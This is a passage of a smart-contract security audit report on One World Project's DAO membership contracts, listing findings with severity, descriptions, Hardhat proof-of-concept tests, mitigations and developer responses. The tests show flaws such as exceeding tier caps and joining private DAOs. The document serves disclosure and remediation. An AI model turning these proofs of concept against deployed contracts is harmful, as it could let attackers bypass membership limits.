Therefore, `msg.sender` cannot be used to retrieve the actual sender of a transaction as this will be the relayer in the case of [`NativeMetaTransaction::executeMetaTransaction`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/meta-transaction/NativeMetaTransaction.sol#L33) being called. As already implemented [here](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L165-L185), the solution is to utilize a `_msgSender()` function that retrieves the signing user from the last 20 bytes of the `msg.data` in these cases.

For this reason, the following functions in `MembershipFactory` are problematic:
* `MembershipFactory::createNewDAOMembership` [[1](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L69), [2](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L84)].
* `MembershipFactory::joinDAO` [[1](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L129), [2](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L130), [3](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L131), [4](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L132)].
* `MembershipFactory::upgradeTier` [[1](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L141), [2](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L142), [3](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L143)].

**Impact:** None of the above calls will work properly in combination when originated via `NativeMetaTransaction::executeMetaTransaction`, with `MembershipFactory::createNewDAOMembership` being the most problematic as it will create the DAO membership token with the `MembershipFactory` contract address as the `creator`. `MembershipFactory::joinDAO` and `MembershipFactory::upgradeTier` will most likely just revert as they require the `msg.sender` (`MembershipFactory`) to hold either `MembershipERC1155` tokens or payment `ERC20` tokens, which it shouldn't.

**Proof of Concept:** Test that can be added in `MembershipFactory.test.ts`:
```javascript
describe("Native meta transaction", function () {
  it("Meta transactions causes creation to use the wrong owner", async function () {
    await currencyManager.addCurrency(testERC20.address);

    const { chainId } = await ethers.provider.getNetwork();
    const salt = ethers.utils.hexZeroPad(ethers.utils.hexlify(chainId), 32)

    const domain = {
      name: 'OWP',
      version: '1',
      salt: salt,
      verifyingContract: membershipFactory.address,
    };
    const types = {
      MetaTransaction: [
        { name: 'nonce', type: 'uint256' },
        { name: 'from', type: 'address' },
        { name: 'functionSignature', type: 'bytes' },
      ],
    };
    const nonce = await membershipFactory.getNonce(addr1.address);
    const metaTransaction = {
      nonce,
      from: addr1.address,
      functionSignature: membershipFactory.interface.encodeFunctionData('createNewDAOMembership', [DAOConfig, TierConfig]),
    };
    const signature = await addr1._signTypedData(domain, types, metaTransaction);
    const {v,r,s} = ethers.utils.splitSignature(signature);

    const tx = await membershipFactory.executeMetaTransaction(metaTransaction.from, metaTransaction.functionSignature, r, s, v);
    const receipt = await tx.wait();
    const event = receipt.events.find((event:any) => event.event === "MembershipDAONFTCreated");
    const nftAddress = event.args[1];
    const creator = await MembershipERC1155.attach(nftAddress).creator();

    // creator becomes the membership factory not addr1
    expect(creator).to.equal(membershipFactory.address);
  });
});
```

**Recommended Mitigation:** Consider using `_msgSender()` instead of `msg.sender` in the above mentioned functions.

**One World Project:** The MetaTransactions only intended use is to call the callExternalContract function.The current implementation is that the `EXTERNAL_CALLER` signs the transaction in backend and then sends the signed object to the user and user sends it to the contract by the `executeMetaTransaction()` function. This way OWP Platform does not have to pay gas fees for any admin `transaction._msgSender()` still added at commit hash [`83ba905`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/commit/83ba905f581be57a56d521deff6d75e0837b2237).

**Cyfrin:** Verified. `_msgSender()` is now used throughout the contract.


### Tier restrictions for `SPONSORED` DAOs can be bypassed by calling `MembershipFactory::upgradeTier`

**Description:** If the DAO specified by the `daoMembershipAddress` parameter in a call to `MembershipFactory::upgradeTier` is registered as [`SPONSORED`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L139), members can upgrade their tier by burning two lower tier tokens for one higher tier token. However, the [`tiers.minted`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/libraries/MembershipDAOStructs.sol#L35) member of [`MembershipDAOStructs::DAOConfig`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/libraries/MembershipDAOStructs.sol#L16) is not updated or validated against the configured [`tiers.amount`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/libraries/MembershipDAOStructs.sol#L32), meaning that a DAO member can mint more higher tier tokens than intended by minting lower tier tokens and upgrading them.

**Impact:** The maximum number of memberships for a given tier can be circumvented by upgrading lower tier. Additionally, since `tiers.minted` is not decremented/incremented for the original and upgraded tiers respectively, no new tokens will be able to be minted for the lower tier.

**Proof of Concept:** The following test can be added to `describe("Upgrade Tier")` in `MembershipFactory.test.ts`:

```javascript
it("can upgrade above max amount and minted not updated", async function () {
  const lowTier = 5;
  const highTier = 4;
  await testERC20.mint(addr1.address, ethers.utils.parseEther("1000000"));
  await testERC20.connect(addr1).approve(membershipFactory.address, ethers.utils.parseEther("1000000"));
  for(let i = 0; i < 40; i++) {
    await membershipFactory.connect(addr1).joinDAO(membershipERC1155.address, highTier);
  }
  // cannot join anymore
  await expect(membershipFactory.connect(addr1).joinDAO(membershipERC1155.address, highTier)).to.be.revertedWith("Tier full.");

  await membershipFactory.connect(addr1).joinDAO(membershipERC1155.address, lowTier);
  await membershipFactory.connect(addr1).joinDAO(membershipERC1155.address, lowTier);

  const tiersBefore = await membershipFactory.daoTiers(membershipERC1155.address);
  expect(tiersBefore[lowTier].minted).to.equal(2);
  expect(tiersBefore[highTier].minted).to.equal(40);

  // but can upgrade tier
  await membershipFactory.connect(addr1).upgradeTier(membershipERC1155.address, lowTier);

  // a total of 41 tokens for tier 4, max amount is 40
  const numberOfTokens = await membershipERC1155.balanceOf(addr1.address, highTier);
  expect(numberOfTokens).to.equal(41);

  // and minted hasn't changed
  const tiersAfter = await membershipFactory.daoTiers(membershipERC1155.address);
  expect(tiersAfter[lowTier].minted).to.equal(tiersBefore[lowTier].minted);
  expect(tiersAfter[highTier].minted).to.equal(tiersBefore[highTier].minted);
});
```

**Recommended Mitigation:** The `tiers.minted` member should be decremented for the original tier and incremented for the upgraded tier, validating that `tier.amount` is not exceeded.

**One World Project:** This is a business logic requirement. We have to allow upgradation even after the tier is full. So, the total minted will remain how many were minted, but the upgraded members will be above and beyond that

**Cyfrin:** Acknowledged.


### No membership restrictions placed on `PRIVATE` DAOs allows anyone to join

**Description:** [`MembershipDAOStructs::DAOType`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/libraries/MembershipDAOStructs.sol#L6-L10) exposes the different types a DAO can have, namely `PRIVATE`, `SPONSORED`, and the default `PUBLIC` which has no restrictions. DAOs of type `SPONSORED` are open but require the use of all tiers, and while `PRIVATE` may be expected to impose further limitations on membership, this case is not handled and so it is possible for anyone to join these DAOs.

**Impact:** Even if a DAO creator specifies `DAOType.PRIVATE`, there is no possibility to place restrictions on which accounts are allowed to join.

**Proof of Concept:** The following test can be added to `describe("Create New DAO Membership")` in `MembershipFactory.test.ts`:
```javascript
it("lets anyone join PRIVATE DAOs", async function () {
  await currencyManager.addCurrency(testERC20.address);

  // DAO membership is private
  DAOConfig.daoType = DAOType.PRIVATE;
  await membershipFactory.createNewDAOMembership(DAOConfig, TierConfig);

  const ensAddress = await membershipFactory.getENSAddress("testdao.eth");
  const membershipERC1155 = await MembershipERC1155.attach(ensAddress);

  await testERC20.mint(addr1.address, ethers.utils.parseEther("20"));
  await testERC20.connect(addr1).approve(membershipFactory.address, ethers.utils.parseEther("20"));

  // but anyone can join
  await expect(membershipFactory.connect(addr1).joinDAO(membershipERC1155.address, 1)).to.not.be.reverted;
});
```

**Recommended Mitigation:** Consider implementing an allowlist option or similar that the creator of a `PRIVATE` DAO can use to enforce membership restrictions.

**One World Project:** There are no intentions to disallow anyone from joining the private DAOs in smart contract, they are just mentioned that way to be obscured from public view in the website.

**Cyfrin:** Acknowledged.


### DAO membership can exceed `MembershipDAOStructs::DAOConfig.maxMembers`

**Description:** The [`MembershipDAOStructs::DAOConfig.maxMembers`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/libraries/MembershipDAOStructs.sol#L18) field is intended as a cap to DAO membership, beyond which should not be exceeded; however, this is currently unused and there is no limit on how many members can join a DAO besides the limit for each respective tier.

**Impact:** Any number of members can join a DAO, limited only by the maximum amount for each tier.

**Proof of Concept:** The following test can be added to `describe("Create New DAO Membership")` in `MembershipFactory.test.ts`:
```javascript
it("can exceed maxMembers", async function () {
  // max members is 1
  DAOConfig.maxMembers = 1;
  await currencyManager.addCurrency(testERC20.address);
  await membershipFactory.createNewDAOMembership(DAOConfig, TierConfig);

  const ensAddress = await membershipFactory.getENSAddress("testdao.eth");
  const membershipERC1155 = await MembershipERC1155.attach(ensAddress);

  await testERC20.mint(addr1.address, ethers.utils.parseEther("20"));
  await testERC20.connect(addr1).approve(membershipFactory.address, ethers.utils.parseEther("20"));
  await testERC20.mint(addr2.address, ethers.utils.parseEther("20"));
  await testERC20.connect(addr2).approve(membershipFactory.address, ethers.utils.parseEther("20"));

  // two members can join
  await expect(membershipFactory.connect(addr1).joinDAO(membershipERC1155.address, 1)).to.not.be.reverted;
  await expect(membershipFactory.connect(addr2).joinDAO(membershipERC1155.address, 1)).to.not.be.reverted;
});
```

**Recommended Mitigation:** Consider validating the amount of members who have joined a DAO and enforce no more than `maxMembers`.

**One World Project:** maxMembers is only for data verification in backend. Updated the value acc to new data. Fixed in [`e60b078`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/commit/e60b078f09d4ed0f1e509f36a2a6d42293815737) and [`510f305`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/commit/510f305e24a89e0815934ab257a413b9e835607f)

**Cyfrin:** Verified. The sum of `tier.amount` cannot surpass `maxMembers` and `tier.amount` is validated when joining.


### Lowest tier (highest index) membership cannot be upgraded

**Description:** For `SPONSORED` DAOs, members are permitted to upgrade from a lower tier membership to a higher tier by burning two tokens within a call to [`MembershipFactory::upgradeTier`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L135-L144). This logic attempts to [validate](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L140) that the current tier can be upgraded:

```solidity
require(daos[daoMembershipAddress].noOfTiers > fromTierIndex + 1, "No higher tier available.");
```

However, one important detail here to note is that the highest tier membership has the lowest tier index when [referenced](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L140-L142) within `MembershipFactory::upgradeTier`. Hence, the highest tier is denoted by `0` and the lowest tier with the highest index, `6`, meaning that the above validation is off-by-one. `7 > 6 + 1` is `false` and it is not possible to upgrade from the lowest tier (highest index) membership. Also note that attempted upgrades from the highest tier (lowest index) fail only due to a [revert on underflow](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L142) when attempting to mint.

**Impact:** DAO members cannot upgrade the lowest tier memberships to higher tiers.

**Proof of Concept:** The following test can be added to `describe("Upgrade Tier")` in `MembershipFactory.test.ts`:
```javascript
it("cannot upgrade from lowest tier, highest index", async function () {
  const fromTierIndex = 6;
  await testERC20.mint(addr1.address, ethers.utils.parseEther("1000000"));
  await testERC20.connect(addr1).approve(membershipFactory.address, ethers.utils.parseEther("1000000"));

  await membershipFactory.connect(addr1).joinDAO(membershipERC1155.address, fromTierIndex);
  await membershipFactory.connect(addr1).joinDAO(membershipERC1155.address, fromTierIndex);

  // cannot upgrade from highest index, lowest tier, because of off-by-one
  await expect(membershipFactory.connect(addr1).upgradeTier(membershipERC1155.address, fromTierIndex)).to.be.revertedWith("No higher tier available.");
});
```

**Recommended Mitigation:** Remove the `+ 1`:

```diff
-    require(daos[daoMembershipAddress].noOfTiers > fromTierIndex + 1, "No higher tier available.");
+    require(daos[daoMembershipAddress].noOfTiers > fromTierIndex, "No higher tier available.");
```

**One World Project:** Fixed in [`0a94d44`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/commit/0a94d44bd51b69bbaa2a624f545bdebff0785535).

**Cyfrin:** Verified. Comparison is now `>=`.


### DAO members have no option to leave

**Description:** `MembershipFactory` exposes methods to join a DAO and upgrade tiers within a `SPONSORED` type DAO; however, there is no logic directly exposed to DAO members to burn their membership token(s) if they decide to leave the DAO. The only role with permissions to execute this is `EXTERNAL_CALLER` who can do so on behalf of the user, presumably at their request.

**Impact:** DAO members cannot leave without the cooperation of `EXTERNAL_CALLER`.

**Recommended Mitigation:** Consider exposing burn logic directly to DAO members so they have the option to leave.

**One World Project:** There is intentionally no process in place for a member to exit the DAO as per business logic. They can be removed by burning their Membership NFTs through off-chain process by the `EXTERNAL_CALLER`.

**Cyfrin:** Acknowledged. This dependency introduces additional risks, and we recommend ensuring the off-chain service meets stringent security standards.

\clearpage
## Low Risk


### `MembershipERC1155` should use OpenZeppelin upgradeable base contracts

**Description:** `MembershipERC1155` is an implementation contract intended for use with `TransparentUpgradeableProxy`, controlled via an instance of `ProxyAdmin`; however, it does not utilize the OpenZeppelin upgradeable contracts which are designed to avoid storage collisions between upgrades.

**Impact:** Upgrading the contract with new OpenZeppelin libraries can lead to storage collisions.

**Recommended Mitigation:** Consider using the upgradeable versions of `ERC1155`, `AccessControl` and `Initializable`.

**One World Project:** Updated the openzeppelin version, and solidity version. Had to change some functions due to change in openzeppelins contracts in [`1c3e820`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/commit/1c3e820adc53d977cd2337af1c2d524fc1ac2782).

**Cyfrin:** Verified. `MembershipERC1155` now uses upgradeable versions of OpenZeppelin contracts. OpenZeppelin library version upgraded as well.


### State update performed after external call in `MembershipERC1155::mint`

**Description:** When `MembershipERC1155::mint` is invoked during a call to `MembershipFactory::joinDAO`, the `totalSupply` increment is performed after the call to `ERC1155::_mint`:

```solidity
function mint(address to, uint256 tokenId, uint256 amount) external override onlyRole(OWP_FACTORY_ROLE) {
    _mint(to, tokenId, amount, "");
    totalSupply += amount * 2 ** (6 - tokenId); // Update total supply with weight
}
```

While there does not appear to be any immediate impact, this is in violation of the Checks-Effects-Interactions (CEI) pattern and thus potentially unsafe due to the [invocation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/49c0e4370d0cc50ea6090709e3835a3091e33ee2/contracts/token/ERC1155/ERC1155.sol#L285) of [`ERC1155::_doSafeTransferAcceptanceCheck`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/49c0e4370d0cc50ea6090709e3835a3091e33ee2/contracts/token/ERC1155/ERC1155.sol#L467-L486):

```solidity
if (to.isContract()) {
    try IERC1155Receiver(to).onERC1155Received(operator, from, id, amount, data) returns (bytes4 response) {
        if (response != IERC1155Receiver.onERC1155Received.selector) {
            revert("ERC1155: ERC1155Receiver rejected tokens");
        }
```

**Impact:** There does not appear to be any immediate impact, although any code executed within a receiver smart contract will work with an incorrect `totalSupply` state.

**Recommended Mitigation:** Consider increasing the `totalSupply` before the call to `_mint()`.

**One World Project:** Updated the pattern in [`30465a3`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/commit/30465a3197adea883413298a9ac17fe8a1f0289e).

**Cyfrin:** Verified. State changes now done before external call is made.


### `TierConfig::price` is not validated to follow `TierConfig::power` which itself is not used or validated

**Description:** When creating a new DAO membership, the creator can specify a [`TierConfig::power`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/libraries/MembershipDAOStructs.sol#L34); however, this value is never used or validated and is assumed to be `2` throughout the codebase, for example in `MembershipFactory::upgradeTier` where it is assumed that two lower tier tokens can be burnt for one higher tier token:

```solidity
IMembershipERC1155(daoMembershipAddress).burn(msg.sender, fromTierIndex, 2);
IMembershipERC1155(daoMembershipAddress).mint(msg.sender, fromTierIndex - 1, 1);
```

And in [`MembershipERC1155::shareOf`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L165-L176) where the multipliers are hardcoded:

```solidity
function shareOf(address account) public view returns (uint256) {
    return (balanceOf(account, 0) * 64) +
           (balanceOf(account, 1) * 32) +
           (balanceOf(account, 2) * 16) +
           (balanceOf(account, 3) * 8) +
           (balanceOf(account, 4) * 4) +
           (balanceOf(account, 5) * 2) +
           balanceOf(account, 6);
}
```

In addition to this, the `TierConfig::price` is never validated to actually increase with the `TierConfig::power` in both [`MembershipFactory::createNewDAOMembership`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L56) or [`MembershipFactory::updateDAOMembership`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L94):

```solidity
for (uint256 i = 0; i < tierConfigs.length; i++) {
    dao.tiers.push(tierConfigs[i]);
}
```

Therefore, DAOs can be created with prices that do not adhere to either `power` specification. Since the `power` is assumed to be `2` in `MembershipFactory::upgradeTier`, this could result in upgrades being cheaper than intended.

**Impact:** The `power` configuration sent by the DAO creator is not used and assumed to be `2` throughout. `TierConfig::price` is also not validated to actually follow the `power` provided.

**Recommended Mitigation:** Consider using and validating `TierConfig::power` where mentioned above.

**One World Project:** This is acc. To the business logic. The upgradation always takes 2 NFTs from lower tier to mint one higher tier one. The power, among other values, is customizable by the dao creator, but it is kept in contract only for off chain validation and has no direct use in the contract.

**Cyfrin:** Acknowledged.


### DAOs of all types can be updated with a lower number of tiers and are not validated to be above zero

**Description:** When creating a new DAO membership in `MembershipFactory::createNewDAOMembership`, the tiers are [validated](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L60) to be non-zero and not exceed the maximum after parallel data structures are [validated](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L59) to be equal:

```solidity
require(daoConfig.noOfTiers == tierConfigs.length, "Invalid tier input.");
require(daoConfig.noOfTiers > 0 && daoConfig.noOfTiers <= 7, "Invalid tier count.");
```

For `SPONSORED` DAOs, the number of tiers is [validated](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L62-L64) to be equal to the maximum:

```solidity
if (daoConfig.daoType == DAOType.SPONSORED) {
    require(daoConfig.noOfTiers == 7, "Invalid tier count for sponsored.");
}
```

However, there is no such validation when `MembershipFactory::updateDAOMembership` is called, aside from the [cap](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L97) on the number of tiers.

**Impact:** DAOs of all types can be effectively closed by updating the number of tiers to zero.

**Recommended Mitigation:** Consider retaining the original validation if this behavior is not intended, ensuring that the number of tiers remains above zero for all DAOs and that `SPONSORED` DAOs must have the maximum number of tiers.

**One World Project:** Added checks in [`1b05816`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/commit/1b05816da53ecefa02483141eeef689b331b328d).

**Cyfrin:** Verified. `tiers` is now checked to be `> 0` and if DAO is `SPONSORED` to equal to `7`.


### `NativeMetaTransaction::executeMetaTransaction` is unnecessarily `payable`

**Description:** `NativeMetaTransaction::executeMetaTransaction` is marked [`payable`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/meta-transaction/NativeMetaTransaction.sol#L33-L39) but, unlike the [OpenZeppelin implementation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/49c0e4370d0cc50ea6090709e3835a3091e33ee2/contracts/metatx/MinimalForwarder.sol#L55), the [`low-level call`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/meta-transaction/NativeMetaTransaction.sol#L62-L64) in the function body does not forward any native token. Hence, any native token balance sent as part of the transaction will be stuck in the implementing contract.

**Impact:** In the case of `MembershipFactory`, native token balances can be rescued by the `EXTERNAL_CALLER` role, but for `OWPIdentity` any native token would be stuck forever.

**Recommended Mitigation:** Consider removing `payable` from `NativeMetaTransaction::executeMetaTransaction`, since native token is not used in any of the contracts and so it is not needed.

There is also [a comment](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/meta-transaction/NativeMetaTransaction.sol#L22-L23) about the `MetaTransactionStruct` that could then be reworded to say  _"value isn't included because it is not used in the implementing contracts"_.

**One World Project:** Updated in [`e60b078`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/commit/e60b078f09d4ed0f1e509f36a2a6d42293815737)

**Cyfrin:** Verified. `msg.value` is now forwarded.

\clearpage
## Informational


### `MembershipERC1155` implementation contract can be initialized

**Description:** `MembershipERC1155` is an implementation contract intended to be used with the Transparent upgradeable proxy pattern; however, it can be initialized since the `initialize()` function can be called by anyone.

**Impact:** This cannot be abused in any way other than initializing the implementation contract, which does not affect the proxy but may be confusing for consumers.

**Recommended Mitigation:** Consider invoking [`Initializable::_disableInitializers`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/72c152dc1c41f23d7c504e175f5b417fccc89426/contracts/proxy/utils/Initializable.sol#L184-L203) within the body of the constructor.

**One World Project:** Added in [`09b6f0f`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/commit/09b6f0f978d2a8d2952a6938bf5756bec8a0170d).

**Cyfrin:** Verified. `_disabledInitializers()` is now called in the constructor.


### Consider making `MembershipERC1155::totalSupply` `public`

**Description:** The [`totalSupply`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L23) variable in the `MembershipERC1155` contract is currently marked as `private`:

```solidity
uint256 private totalSupply;
```

As this state variable could be valuable for off-chain computations, it is recommended to consider making it `public` for easier access.

**One World Project:** Updated in [`09b6f0f`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/commit/09b6f0f978d2a8d2952a6938bf5756bec8a0170d).

**Cyfrin:** Verified. `totalSupply` is now public.


### Mixed use of `uint` and `uint256` in `MembershipERC1155`

**Description:** The state declarations in `MembershipERC1155` use both `uint` and `uint256`:

```solidity
mapping(address => uint256) public totalProfit;
mapping(address => mapping(address => uint)) internal lastProfit;
mapping(address => mapping(address => uint)) internal savedProfit;

uint256 internal constant ACCURACY = 1e30;

event Claim(address indexed account, uint amount);
event Profit(uint amount);
```

This is inconsistent and confusing. Consider using `uint256` everywhere as this is more expressive.

**One World Project:** Updated in [`09b6f0f`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/commit/09b6f0f978d2a8d2952a6938bf5756bec8a0170d).

**Cyfrin:** Verified. `uint256` is now used.


### Unnecessary storage gap in `MembershipERC1155` can be removed

**Description:** `MembershipERC1155` declares a [storage gap](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L212-L213) at the very end of the contract:

```solidity
uint256[50] private __gap;
```

Such gaps are intended for use by abstract base contracts as they allow state variables to be added to the contract storage layout without "shifting down" the total number of utilized storage slots and thus potentially causing storage collisions in the inheriting contract.

`MembershipERC1155` is not intended to be used as a base contract inherited by other contracts and so has no need for a storage gap, meaning the one present is unnecessary and can be removed.

**One World Project:** Removed in [`09b6f0f`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/commit/09b6f0f978d2a8d2952a6938bf5756bec8a0170d).

**Cyfrin:** Verified. `__gap` has been removed.


### `MembershipFactory::owpWallet` lacks explicitly declared visibility

**Description:** [`MembershipFactory::owpWallet`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L20) has no declared visibility:

```solidity
address owpWallet;
```

This gives it the default `internal` visibility; however, it is best practice to explicitly specify the visibility for state variables in the contract.

**One World Project:** Made public in [`09b6f0f`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/commit/09b6f0f978d2a8d2952a6938bf5756bec8a0170d).

**Cyfrin:** Verified. `owpWallet` is public.



### Unnecessarily complex `ProxyAdmin` ownership setup

**Description:** The `ProxyAdmin` contract is created in the `MembershipFactory` constructor:

```solidity
constructor(address _currencyManager, address _owpWallet, string memory _baseURI, address _membershipImplementation) {
    // ...
    proxyAdmin = new ProxyAdmin();
```

`ProxyAdmin` inherits `Ownable` and sets the contract owner to `msg.sender`, meaning that this will be the `MembershipFactory` contract.

This ownership structure is further complicated by the requirement for the `EXTERNAL_CALLER` role to call `MembershipFactory::callExternalContract` when managing proxy upgrades. A simpler solution would be to deploy the `ProxyAdmin` independently and pass its address to the `MembershipFactory` constructor.

**Recommended Mitigation:** Consider deploying a separate instance of `ProxyAdmin` and passing its address as a constructor parameter, allowing the ownership structure to be less complex and easier to manage.

**One World Project:** Acknowledged. Intentional. Kept as it is.

**Cyfrin:** Acknowledged.


### Upgrading DAO tier emits same event as minting the same tier

**Description:** If a DAO is registered as SPONSORED, its members can upgrade their membership tier by burning two lower tier tokens for one higher tier token in a call to `MembershipFactory::upgradeTier`.

This will [emit](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L143) the `UserJoinedDAO` event which is the same as that emitted when joining a DAO for the first time, making it impossible to differentiate between these two actions.

**Recommended Mitigation:** Consider emitting a separate event when a DAO member upgrades their tier.

**One World Project:** Upgrading mints a new token in a new tier, so same event is kept to track events efficiently in backend.

**Cyfrin:** Acknowledged.


### Inconsistent indentation formatting in `CurrencyManager`

**Description:** The indentation in `CurrencyManager` is 2 spaces while the indentation for the rest of the codebase is 4 spaces.

**Recommended Mitigation:** Consider formatting `CurrencyManager` to be consistent with the 4 space indentation convention.

**One World Project:** Acknowledged.

**Cyfrin:** Acknowledged.


### Unused variables should be used or removed

**Description:** There following variables are declared but unused throughout the codebase:

* [`MembershipDAOStructs::UINT64_MAX`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/libraries/MembershipDAOStructs.sol#L4)
* [`MembershipERC1155::deployer`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L21)
* [`CurrencyManager::admin`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/CurrencyManager.sol#L21)

Consider using or removing these variables.

**One World Project:** Removed in [`09b6f0f`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/commit/09b6f0f978d2a8d2952a6938bf5756bec8a0170d).

**Cyfrin:** Verified. The above variables have all been removed.


### Incorrect `EIP712Base` constructor documentation

**Description:** [This comment](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/meta-transaction/EIP712Base.sol#L21-L29) documenting the `EIP712` constructor is incorrect:

```solidity
// supposed to be called once while initializing.
// one of the contractsa that inherits this contract follows proxy pattern
// so it is not possible to do this in a constructor
```

The only contract in the project using a proxy pattern is `MembershipERC1155` which does not inherit `EIP712Base` directly or otherwise. Hence, the comment is not needed.

There is also a typo:

```diff
-  // one of the contractsa that inherits this contract follows proxy pattern
+  // one of the contracts that inherits this contract follows proxy pattern
```

**One World Project:** Removed in [`09b6f0f`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/commit/09b6f0f978d2a8d2952a6938bf5756bec8a0170d).

**Cyfrin:** Verified. The documentation is now removed.


